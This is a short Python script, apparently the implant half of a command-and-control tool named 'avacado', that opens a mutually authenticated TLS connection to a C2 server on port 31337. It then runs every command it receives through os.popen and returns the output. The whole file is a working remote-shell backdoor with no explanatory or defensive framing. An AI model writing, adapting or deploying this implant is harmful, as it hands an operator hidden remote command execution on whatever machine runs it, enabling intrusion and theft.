#!/usr/bin/env python3

import socket
import ssl
from os import popen

hostname = "avacado-server.c2"
server_cert = "../certs/server/rootCA.pem"
client_cert = "../certs/client/avacado-implant.c2-client.pem"
client_key = "../certs/client/avacado-implant.c2-client-key.pem"

# mTLS settings
ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH, cafile=server_cert)
ctx.load_cert_chain(client_cert, client_key)
ctx.post_handshake_auth = True

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    with ctx.wrap_socket(s, server_side=False, server_hostname=hostname) as ssock:
        ssock.connect(("127.0.0.1", 31337))
        # Receive data from server
        while True:
            data = ssock.recv(1024)
            proc = popen(data.decode("utf-8"))
            ssock.sendall(proc.read().encode("utf-8"))
